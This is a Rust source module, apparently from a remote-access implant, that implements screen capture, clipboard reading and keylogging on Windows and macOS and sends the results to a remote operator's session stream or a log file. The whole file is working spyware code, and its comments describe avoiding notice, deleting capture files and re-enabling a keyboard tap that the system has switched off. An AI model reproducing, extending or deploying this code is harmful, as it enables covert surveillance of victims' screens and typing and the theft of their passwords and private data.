//! The desktop extras: the screen, the clipboard and the keyboard.
//!
//! On Windows everything here is plain Win32 through the FFI, so the
//! implant does not take a dependency for it.  On macOS the same three
//! things are done with the frameworks of the system: the capture comes
//! from screencapture, the clipboard from pbpaste, and the keys from an
//! event tap of CoreGraphics.
//!
//! The screen is captured as a BMP on Windows: the pixels come straight
//! out of GDI, and the console turns the file into a PNG when it saves
//! it.  On macOS the capture is a PNG already.
//!
//! Every other platform answers "that is a Windows or macOS capability",
//! because the implant says what it cannot do instead of pretending.

use crate::task::Outcome;

#[cfg(windows)]
mod sys {
    use std::os::raw::{c_int, c_void};

    pub type HDC = *mut c_void;
    pub type HGDIOBJ = *mut c_void;
    pub type HBITMAP = *mut c_void;
    pub type HWND = *mut c_void;
    pub type BOOL = i32;
    pub type UINT = u32;
    pub type WORD = u16;
    pub type DWORD = u32;
    pub type LONG = i32;

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct BITMAPINFOHEADER {
        pub biSize: DWORD,
        pub biWidth: LONG,
        pub biHeight: LONG,
        pub biPlanes: WORD,
        pub biBitCount: WORD,
        pub biCompression: DWORD,
        pub biSizeImage: DWORD,
        pub biXPelsPerMeter: LONG,
        pub biYPelsPerMeter: LONG,
        pub biClrUsed: DWORD,
        pub biClrImportant: DWORD,
    }

    #[repr(C)]
    pub struct BITMAPINFO {
        pub bmiHeader: BITMAPINFOHEADER,
        pub bmiColors: [u32; 3],
    }

    #[link(name = "gdi32")]
    extern "system" {
        pub fn GetDC(hwnd: HWND) -> HDC;
        pub fn ReleaseDC(hwnd: HWND, hdc: HDC) -> c_int;
        pub fn CreateCompatibleDC(hdc: HDC) -> HDC;
        pub fn DeleteDC(hdc: HDC) -> BOOL;
        pub fn CreateCompatibleBitmap(hdc: HDC, cx: c_int, cy: c_int) -> HBITMAP;
        pub fn SelectObject(hdc: HDC, obj: HGDIOBJ) -> HGDIOBJ;
        pub fn DeleteObject(obj: HGDIOBJ) -> BOOL;
        pub fn BitBlt(
            hdc: HDC,
            x: c_int,
            y: c_int,
            cx: c_int,
            cy: c_int,
            hdc_src: HDC,
            x1: c_int,
            y1: c_int,
            rop: DWORD,
        ) -> BOOL;
        pub fn GetDIBits(
            hdc: HDC,
            bmp: HBITMAP,
            start: UINT,
            lines: UINT,
            bits: *mut c_void,
            info: *mut BITMAPINFO,
            usage: UINT,
        ) -> c_int;
    }

    #[link(name = "user32")]
    extern "system" {
        pub fn GetSystemMetrics(index: c_int) -> c_int;
        pub fn GetAsyncKeyState(vkey: c_int) -> i16;
        pub fn OpenClipboard(owner: HWND) -> BOOL;
        pub fn CloseClipboard() -> BOOL;
        pub fn GetClipboardData(format: UINT) -> HGDIOBJ;
    }

    #[link(name = "kernel32")]
    extern "system" {
        pub fn GlobalLock(mem: HGDIOBJ) -> *mut c_void;
        pub fn GlobalUnlock(mem: HGDIOBJ) -> BOOL;
    }

    pub const SRCCOPY: DWORD = 0x00CC0020;
    pub const DIB_RGB_COLORS: UINT = 0;
    pub const SM_CXSCREEN: c_int = 0;
    pub const SM_CYSCREEN: c_int = 1;
    pub const CF_UNICODETEXT: UINT = 13;
}

/// The capture of the screen, as a BMP file.
#[cfg(windows)]
pub fn screen() -> Result<Vec<u8>, String> {
    use std::os::raw::c_void;
    unsafe {
        let width = sys::GetSystemMetrics(sys::SM_CXSCREEN);
        let height = sys::GetSystemMetrics(sys::SM_CYSCREEN);
        if width <= 0 || height <= 0 {
            return Err("the screen could not be measured".to_string());
        }
        let screen_dc = sys::GetDC(std::ptr::null_mut());
        if screen_dc.is_null() {
            return Err("no device context".to_string());
        }
        let mem_dc = sys::CreateCompatibleDC(screen_dc);
        if mem_dc.is_null() {
            sys::ReleaseDC(std::ptr::null_mut(), screen_dc);
            return Err("no memory device context".to_string());
        }
        let bitmap = sys::CreateCompatibleBitmap(screen_dc, width, height);
        if bitmap.is_null() {
            sys::DeleteDC(mem_dc);
            sys::ReleaseDC(std::ptr::null_mut(), screen_dc);
            return Err("no bitmap".to_string());
        }
        let old = sys::SelectObject(mem_dc, bitmap as sys::HGDIOBJ);
        sys::BitBlt(
            mem_dc, 0, 0, width, height, screen_dc, 0, 0, sys::SRCCOPY,
        );

        let mut info = sys::BITMAPINFO {
            bmiHeader: sys::BITMAPINFOHEADER {
                biSize: 0,
                biWidth: 0,
                biHeight: 0,
                biPlanes: 1,
                biBitCount: 24,
                biCompression: 0,
                biSizeImage: 0,
                biXPelsPerMeter: 0,
                biYPelsPerMeter: 0,
                biClrUsed: 0,
                biClrImportant: 0,
            },
            bmiColors: [0; 3],
        };
        info.bmiHeader.biSize = std::mem::size_of::<sys::BITMAPINFOHEADER>() as u32;
        info.bmiHeader.biWidth = width;
        info.bmiHeader.biHeight = height;
        info.bmiHeader.biPlanes = 1;
        info.bmiHeader.biBitCount = 24;
        info.bmiHeader.biCompression = 0;

        let mut buffer = vec![0u8; (width as usize) * (height as usize) * 3];
        let lines = sys::GetDIBits(
            mem_dc,
            bitmap,
            0,
            height as u32,
            buffer.as_mut_ptr() as *mut c_void,
            &mut info as *mut sys::BITMAPINFO,
            sys::DIB_RGB_COLORS,
        );

        sys::SelectObject(mem_dc, old);
        sys::DeleteObject(bitmap as sys::HGDIOBJ);
        sys::DeleteDC(mem_dc);
        sys::ReleaseDC(std::ptr::null_mut(), screen_dc);
        if lines == 0 {
            return Err("the screen could not be read".to_string());
        }
        Ok(bmp(width, height, &buffer))
    }
}

/// Wrap the raw bits of a capture in a BMP file.
///
/// The capture comes out of GDI bottom-up in BGR, which is exactly what a
/// BMP file stores, so the conversion is a header and nothing else.
#[cfg(windows)]
fn bmp(width: i32, height: i32, bits: &[u8]) -> Vec<u8> {
    let row = ((width as u32) * 3 + 3) & !3;
    let padding = row - (width as u32) * 3;
    let pixel_bytes = row * height as u32;
    let mut out: Vec<u8> = Vec::with_capacity(54 + pixel_bytes as usize);
    out.extend_from_slice(b"BM");
    out.extend_from_slice(&(54u32 + pixel_bytes).to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    out.extend_from_slice(&54u32.to_le_bytes());
    out.extend_from_slice(&40u32.to_le_bytes());
    out.extend_from_slice(&width.to_le_bytes());
    out.extend_from_slice(&height.to_le_bytes());
    out.extend_from_slice(&1u16.to_le_bytes());
    out.extend_from_slice(&24u16.to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    out.extend_from_slice(&pixel_bytes.to_le_bytes());
    out.extend_from_slice(&2835i32.to_le_bytes());
    out.extend_from_slice(&2835i32.to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    // A BMP with a positive height stores its rows bottom-up, and the
    // capture comes out of GDI bottom-up as well, so the rows are copied in
    // the order they arrive.
    for y in 0..height as usize {
        let start = y * row as usize;
        let line = &bits[start..start + (width as usize) * 3];
        out.extend_from_slice(line);
        out.extend(std::iter::repeat(0u8).take(padding as usize));
    }
    out
}

/// The text on the clipboard.
#[cfg(windows)]
pub fn clipboard() -> Result<String, String> {
    unsafe {
        if sys::OpenClipboard(std::ptr::null_mut()) == 0 {
            return Err("the clipboard is locked by another program".to_string());
        }
        let mut text = String::new();
        let handle = sys::GetClipboardData(sys::CF_UNICODETEXT);
        if !handle.is_null() {
            let ptr = sys::GlobalLock(handle);
            if !ptr.is_null() {
                let mut len = 0usize;
                while *((ptr as *const u16).add(len)) != 0 {
                    len += 1;
                }
                let slice = std::slice::from_raw_parts(ptr as *const u16, len);
                text = String::from_utf16_lossy(slice);
                sys::GlobalUnlock(handle);
            }
        }
        sys::CloseClipboard();
        Ok(text)
    }
}

/// The key logger.
///
/// The keys are polled, not hooked: a hook needs a message loop, and a
/// message loop inside a beacon is a lot of machinery for a feature that
/// only has to notice what is typed.  The stream is the same one the
/// sessions use, so the operator sees the keys while they are pressed.
#[cfg(windows)]
pub fn keylog(seconds: u64) -> Result<crate::sessions::Stream, String> {
    let (tx, rx) = std::sync::mpsc::channel::<Vec<u8>>();
    let handle = std::thread::spawn(move || {
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(seconds);
        let mut previous = [false; 256];
        while std::time::Instant::now() < deadline {
            for vk in 0x08u16..=0xFEu16 {
                let down = unsafe { sys::GetAsyncKeyState(vk as i32) & 0x8000 } != 0;
                if down && !previous[vk as usize] {
                    let line = format!("{}\n", describe(vk));
                    if tx.send(line.into_bytes()).is_err() {
                        break;
                    }
                }
                previous[vk as usize] = down;
            }
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
        Ok(Outcome::ok(b"the key logger stopped\n".to_vec()))
    });
    Ok(crate::sessions::Stream::new(rx, handle))
}

/// Write the keys into a file instead of streaming them.
///
/// A stream has to be watched; a file is fetched later, at the operator's
/// own pace, and it keeps the whole of a session in one place.
#[cfg(windows)]
pub fn keylog_to_file(path: &str, seconds: u64) -> Result<String, String> {
    let path = path.to_string();
    std::thread::spawn(move || {
        let mut file = match std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&path)
        {
            Ok(f) => f,
            Err(e) => {
                eprintln!("key logger: {path}: {e}");
                return;
            }
        };
        use std::io::Write;
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(seconds);
        let mut previous = [false; 256];
        while std::time::Instant::now() < deadline {
            for vk in 0x08u16..=0xFEu16 {
                let down = unsafe { sys::GetAsyncKeyState(vk as i32) & 0x8000 } != 0;
                if down && !previous[vk as usize] {
                    let _ = writeln!(file, "{}", describe(vk));
                }
                previous[vk as usize] = down;
            }
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
    });
    Ok(format!("the key logger writes to {path}\n"))
}

/// The key logger that writes into a file is a Windows or macOS capability.
#[cfg(not(any(windows, target_os = "macos")))]
pub fn keylog_to_file(_path: &str, _seconds: u64) -> Result<String, String> {
    Err("the key logger is a Windows or macOS capability".to_string())
}

/// The name of a virtual key code.
#[cfg(windows)]
fn describe(vk: u16) -> String {
    let named = match vk {
        0x08 => "BACKSPACE",
        0x09 => "TAB",
        0x0D => "ENTER",
        0x1B => "ESC",
        0x20 => "SPACE",
        0x7F => "DELETE",
        0x25 => "LEFT",
        0x26 => "UP",
        0x27 => "RIGHT",
        0x28 => "DOWN",
        0x5B => "LWIN",
        0x5C => "RWIN",
        0xA0..=0xA5 => "LSHIFT/CTRL/ALT",
        _ => "",
    };
    if !named.is_empty() {
        return named.to_string();
    }
    if (0x30..=0x39).contains(&vk) || (0x41..=0x5A).contains(&vk) {
        return char::from_u32(vk as u32)
            .map(|c| c.to_string())
            .unwrap_or_else(|| format!("VK_{vk:02X}"));
    }
    format!("VK_{vk:02X}")
}

/// The screen is a Windows or macOS capability.
#[cfg(not(any(windows, target_os = "macos")))]
pub fn screen() -> Result<Vec<u8>, String> {
    Err("the screen is a Windows or macOS capability".to_string())
}

/// The clipboard is a Windows or macOS capability.
#[cfg(not(any(windows, target_os = "macos")))]
pub fn clipboard() -> Result<String, String> {
    Err("the clipboard is a Windows or macOS capability".to_string())
}

/// The key logger is a Windows or macOS capability.
#[cfg(not(any(windows, target_os = "macos")))]
pub fn keylog(_seconds: u64) -> Result<crate::sessions::Stream, String> {
    Err("the key logger is a Windows or macOS capability".to_string())
}

// ---------------------------------------------------------------------------
// macOS
// ---------------------------------------------------------------------------

/// The CoreGraphics and CoreFoundation calls of the event tap.
///
/// The declarations are the ones of the frameworks of the system, and
/// the implant takes no dependency for them: the key logger of macOS
/// needs nothing but the frameworks that are always there.
#[cfg(target_os = "macos")]
mod quartz {
    use std::os::raw::{c_char, c_void};

    pub type CFTypeRef = *const c_void;
    pub type CFStringRef = *mut c_void;
    pub type CFRunLoopRef = *mut c_void;
    pub type CFMachPortRef = *mut c_void;
    pub type CGEventRef = *mut c_void;
    pub type CGEventTapProxy = *mut c_void;
    pub type CGEventMask = u64;

    pub const KCG_HID_EVENT_TAP: u32 = 0;
    pub const KCG_HEAD_INSERT_EVENT_TAP: u32 = 0;
    pub const KCG_EVENT_TAP_OPTION_LISTEN_ONLY: u32 = 0x0000_0001;
    pub const KCG_EVENT_MASK_KEY_DOWN: CGEventMask = 1 << 10;
    pub const KCG_EVENT_KEY_DOWN: u32 = 10;
    pub const KCG_EVENT_TAP_DISABLED_BY_TIMEOUT: u32 = 0xFFFF_FFFE;
    pub const KCG_EVENT_TAP_DISABLED_BY_USER_INPUT: u32 = 0xFFFF_FFFF;
    pub const KCF_STRING_ENCODING_UTF8: u32 = 0x0800_0100;

    pub type TapCallback = extern "C" fn(
        proxy: CGEventTapProxy,
        event_type: u32,
        event: CGEventRef,
        user_info: *mut c_void,
    ) -> CGEventRef;

    #[link(name = "CoreGraphics", kind = "framework")]
    extern "C" {
        pub fn CGEventTapCreate(
            tap: u32,
            place: u32,
            options: u32,
            events_of_interest: CGEventMask,
            callback: TapCallback,
            user_info: *mut c_void,
        ) -> CFMachPortRef;
        pub fn CGEventTapEnable(tap: CFMachPortRef, enable: bool);
        pub fn CGEventKeyboardGetUnicodeString(
            event: CGEventRef,
            max_length: u32,
            actual_length: *mut u32,
            unicode_string: *mut u16,
        );
    }

    #[link(name = "CoreFoundation", kind = "framework")]
    extern "C" {
        pub fn CFRunLoopGetCurrent() -> CFRunLoopRef;
        pub fn CFRunLoopSourceCreate(
            allocator: CFTypeRef,
            source: CFMachPortRef,
        ) -> *mut c_void;
        pub fn CFRunLoopAddSource(
            loop_ref: CFRunLoopRef,
            source: *mut c_void,
            mode: CFStringRef,
        );
        pub fn CFRunLoopRunInMode(
            mode: CFStringRef,
            seconds: f64,
            return_after_source_handled: bool,
        ) -> i32;
        pub fn CFStringCreateWithCString(
            alloc: CFTypeRef,
            c_str: *const c_char,
            encoding: u32,
        ) -> CFStringRef;
        pub fn CFRelease(cf: CFTypeRef);
        pub fn CFMachPortInvalidate(port: CFMachPortRef);
    }
}

/// Where the keys go.
#[cfg(target_os = "macos")]
enum Sink {
    /// The stream the operator watches.
    Stream(std::sync::mpsc::Sender<Vec<u8>>),
    /// The file that keeps the whole of the session.
    File(std::fs::File),
}

/// The state of the event tap.
#[cfg(target_os = "macos")]
struct TapContext {
    sink: std::sync::Mutex<Sink>,
    tap: std::sync::atomic::AtomicPtr<std::os::raw::c_void>,
}

/// The callback of the event tap.
///
/// It runs on the run loop of the thread that opened the tap, so it only
/// writes into the sink and never blocks: a key logger that slows the
/// machine down is a key logger that gets noticed.
#[cfg(target_os = "macos")]
extern "C" fn tap_callback(
    _proxy: quartz::CGEventTapProxy,
    event_type: u32,
    event: quartz::CGEventRef,
    user_info: *mut std::os::raw::c_void,
) -> quartz::CGEventRef {
    if user_info.is_null() {
        return event;
    }
    let context = unsafe { &*(user_info as *const TapContext) };
    if event_type == quartz::KCG_EVENT_TAP_DISABLED_BY_TIMEOUT
        || event_type == quartz::KCG_EVENT_TAP_DISABLED_BY_USER_INPUT
    {
        // The system switched the tap off: it is switched on again.
        let tap = context.tap.load(std::sync::atomic::Ordering::Relaxed);
        if !tap.is_null() {
            unsafe { quartz::CGEventTapEnable(tap, true) };
        }
        return event;
    }
    if event_type != quartz::KCG_EVENT_KEY_DOWN {
        return event;
    }
    let text = unsafe { key_text(event) };
    if text.is_empty() {
        return event;
    }
    if let Ok(mut sink) = context.sink.lock() {
        match &mut *sink {
            Sink::Stream(sender) => {
                let _ = sender.send(text.into_bytes());
            }
            Sink::File(file) => {
                use std::io::Write;
                let _ = file.write_all(text.as_bytes());
            }
        }
    }
    event
}

/// The text of a key press.
#[cfg(target_os = "macos")]
unsafe fn key_text(event: quartz::CGEventRef) -> String {
    let mut buffer = [0u16; 8];
    let mut length: u32 = 0;
    quartz::CGEventKeyboardGetUnicodeString(
        event,
        buffer.len() as u32,
        &mut length,
        buffer.as_mut_ptr(),
    );
    if length == 0 {
        return String::new();
    }
    String::from_utf16_lossy(&buffer[..length as usize])
}

/// Run an event tap for a while and write the keys into the sink.
#[cfg(target_os = "macos")]
fn run_tap(sink: Sink, seconds: u64) -> Result<(), String> {
    let context = Box::into_raw(Box::new(TapContext {
        sink: std::sync::Mutex::new(sink),
        tap: std::sync::atomic::AtomicPtr::new(std::ptr::null_mut()),
    }));
    unsafe {
        let tap = quartz::CGEventTapCreate(
            quartz::KCG_HID_EVENT_TAP,
            quartz::KCG_HEAD_INSERT_EVENT_TAP,
            quartz::KCG_EVENT_TAP_OPTION_LISTEN_ONLY,
            quartz::KCG_EVENT_MASK_KEY_DOWN,
            tap_callback,
            context as *mut std::os::raw::c_void,
        );
        if tap.is_null() {
            drop(Box::from_raw(context));
            return Err(
                "the event tap was refused: the implant needs the permission of the accessibility"
                    .to_string(),
            );
        }
        (*context)
            .tap
            .store(tap as *mut std::os::raw::c_void, std::sync::atomic::Ordering::Relaxed);
        quartz::CGEventTapEnable(tap, true);

        let name = match std::ffi::CString::new("kCFRunLoopDefaultMode") {
            Ok(name) => name,
            Err(_) => {
                quartz::CFMachPortInvalidate(tap);
                drop(Box::from_raw(context));
                return Err("the run loop mode could not be built".to_string());
            }
        };
        let mode = quartz::CFStringCreateWithCString(
            std::ptr::null(),
            name.as_ptr(),
            quartz::KCF_STRING_ENCODING_UTF8,
        );
        if mode.is_null() {
            quartz::CFMachPortInvalidate(tap);
            drop(Box::from_raw(context));
            return Err("the run loop mode could not be built".to_string());
        }
        let source = quartz::CFRunLoopSourceCreate(std::ptr::null(), tap);
        let loop_ref = quartz::CFRunLoopGetCurrent();
        quartz::CFRunLoopAddSource(loop_ref, source, mode);
        // The run loop returns when the time is up, and the tap is
        // invalidated on the way out so no callback can come after the
        // state is gone.
        quartz::CFRunLoopRunInMode(mode, seconds as f64, false);
        quartz::CFMachPortInvalidate(tap);
        quartz::CFRelease(mode as quartz::CFTypeRef);
        drop(Box::from_raw(context));
    }
    Ok(())
}

/// The capture of the screen, as a PNG file.
///
/// The capture comes from screencapture, the tool of the system, so the
/// implant takes no dependency for it.  The file is removed as soon as
/// it is read: the operator has the bytes and the disk has nothing.
#[cfg(target_os = "macos")]
pub fn screen() -> Result<Vec<u8>, String> {
    let path = std::env::temp_dir().join(format!("umbra-screen-{}.png", std::process::id()));
    let out = std::process::Command::new("/usr/sbin/screencapture")
        .arg("-x")
        .arg("-t")
        .arg("png")
        .arg(&path)
        .output()
        .map_err(|e| format!("screencapture: {e}"))?;
    if !out.status.success() {
        let _ = std::fs::remove_file(&path);
        return Err(format!(
            "screencapture: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    let data = std::fs::read(&path).map_err(|e| format!("the capture could not be read: {e}"))?;
    let _ = std::fs::remove_file(&path);
    Ok(data)
}

/// The text on the clipboard.
#[cfg(target_os = "macos")]
pub fn clipboard() -> Result<String, String> {
    let out = std::process::Command::new("/usr/bin/pbpaste")
        .output()
        .map_err(|e| format!("pbpaste: {e}"))?;
    if !out.status.success() {
        return Err(format!(
            "pbpaste: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

/// The key logger.
///
/// The keys come from an event tap of CoreGraphics: the tap hands every
/// key press to a callback, and the callback writes it into the stream.
/// The tap is opened in listening mode, so nothing that is typed is
/// swallowed, and it needs the permission of the accessibility: without
/// it the system refuses the tap and the operator is told why.
#[cfg(target_os = "macos")]
pub fn keylog(seconds: u64) -> Result<crate::sessions::Stream, String> {
    let (tx, rx) = std::sync::mpsc::channel::<Vec<u8>>();
    let handle = std::thread::spawn(move || {
        run_tap(Sink::Stream(tx), seconds)?;
        Ok(Outcome::ok(b"the key logger stopped\n".to_vec()))
    });
    Ok(crate::sessions::Stream::new(rx, handle))
}

/// Write the keys into a file instead of streaming them.
#[cfg(target_os = "macos")]
pub fn keylog_to_file(path: &str, seconds: u64) -> Result<String, String> {
    let path = path.to_string();
    std::thread::spawn(move || {
        let file = match std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&path)
        {
            Ok(f) => f,
            Err(e) => {
                eprintln!("key logger: {path}: {e}");
                return;
            }
        };
        if let Err(e) = run_tap(Sink::File(file), seconds) {
            eprintln!("key logger: {path}: {e}");
        }
    });
    Ok(format!("the key logger writes to {path}\n"))
}
